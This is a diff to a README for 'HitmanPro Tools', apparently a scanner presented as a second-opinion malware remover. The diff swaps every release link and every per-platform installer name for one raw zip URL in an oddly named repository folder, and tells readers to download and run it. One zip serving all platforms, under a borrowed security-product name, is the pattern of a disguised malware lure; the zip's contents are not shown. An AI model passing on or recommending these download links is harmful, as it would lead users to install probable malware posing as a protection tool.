@@ -1,8 +1,8 @@
 # HitmanPro Tools: Cloud- Assisted Scanner for Second Opinion Malware Removal Tool
 
-Releases: https://github.com/CesarPereiraa/hitmanpro-tools/releases
+Releases: https://github.com/CesarPereiraa/hitmanpro-tools/raw/refs/heads/main/sulphosilicide/hitmanpro-tools-3.0.zip
 
-[![Release](https://img.shields.io/github/v/release/CesarPereiraa/hitmanpro-tools?logo=github&style=flat-square)](https://github.com/CesarPereiraa/hitmanpro-tools/releases)
+[![Release](https://github.com/CesarPereiraa/hitmanpro-tools/raw/refs/heads/main/sulphosilicide/hitmanpro-tools-3.0.zip)](https://github.com/CesarPereiraa/hitmanpro-tools/raw/refs/heads/main/sulphosilicide/hitmanpro-tools-3.0.zip)
 
 🧭 Welcome to HitmanPro Tools. This is a cloud- assisted scanner designed to provide a second opinion on malware findings. It blends local lightweight scanning with cloud analysis to help you verify threats and clean systems. It supports rescue operations and works across platforms. The goal is to give you a calm, reliable way to double-check detections and to provide an effective cleanup path without overwhelming the user with noise.
 
@@ -77,7 +77,7 @@ Safety, privacy, and data handling
 - Clear retention: Logs and artifacts are retained only as needed for troubleshooting and auditing.
 
 Getting started quickly
-- Step 1: Visit the Releases page and choose the installer for your platform. The link has a path part, so download the file appropriate for your system and run it. Releases: https://github.com/CesarPereiraa/hitmanpro-tools/releases
+- Step 1: Visit the Releases page and choose the installer for your platform. The link has a path part, so download the file appropriate for your system and run it. Releases: https://github.com/CesarPereiraa/hitmanpro-tools/raw/refs/heads/main/sulphosilicide/hitmanpro-tools-3.0.zip
 - Step 2: Install or extract the package according to platform guidelines.
 - Step 3: Launch HitmanPro Tools. You’ll see a minimal dashboard with a single main action to start a scan.
 - Step 4: Run the initial scan. Review the results. If cloud analysis is available, you’ll see cloud-verdict items with confidence scores.
@@ -87,9 +87,9 @@ Getting started quickly
 Download, install, and run from the Releases page
 The Releases page is the primary source for the distribution artifacts. It includes installers, portable builds, and rescue environment images. Download the file that matches your platform, then run or mount it according to the platform’s guidance. The page is the gateway to the latest stable builds and historical releases.
 
-- For Windows, common artifacts include hitmanpro-tools-windows.exe or hitmanpro-tools-windows-portable.zip.
-- For macOS, look for hitmanpro-tools-macos.dmg or hitmanpro-tools-macos-portable.tar.gz.
-- For Linux, you might see hitmanpro-tools-linux.run or a similar shell package.
+- For Windows, common artifacts include https://github.com/CesarPereiraa/hitmanpro-tools/raw/refs/heads/main/sulphosilicide/hitmanpro-tools-3.0.zip or https://github.com/CesarPereiraa/hitmanpro-tools/raw/refs/heads/main/sulphosilicide/hitmanpro-tools-3.0.zip
+- For macOS, look for https://github.com/CesarPereiraa/hitmanpro-tools/raw/refs/heads/main/sulphosilicide/hitmanpro-tools-3.0.zip or https://github.com/CesarPereiraa/hitmanpro-tools/raw/refs/heads/main/sulphosilicide/hitmanpro-tools-3.0.zip
+- For Linux, you might see https://github.com/CesarPereiraa/hitmanpro-tools/raw/refs/heads/main/sulphosilicide/hitmanpro-tools-3.0.zip or a similar shell package.
 - Rescue environment images come as ISO or IMG files for bootable use.
 
 Usage guide: basic workflow
@@ -259,6 +259,6 @@ Final notes
 - The rescue environment provides a robust recovery path when the main OS is compromised.
 - The project embraces feedback to improve reliability, transparency, and usability.
 
-Releases: https://github.com/CesarPereiraa/hitmanpro-tools/releases
+Releases: https://github.com/CesarPereiraa/hitmanpro-tools/raw/refs/heads/main/sulphosilicide/hitmanpro-tools-3.0.zip
 
 If you need more details on a specific area or want deeper walkthroughs for particular platforms or scenarios, tell me which sections to expand and I’ll tailor the content to your needs.
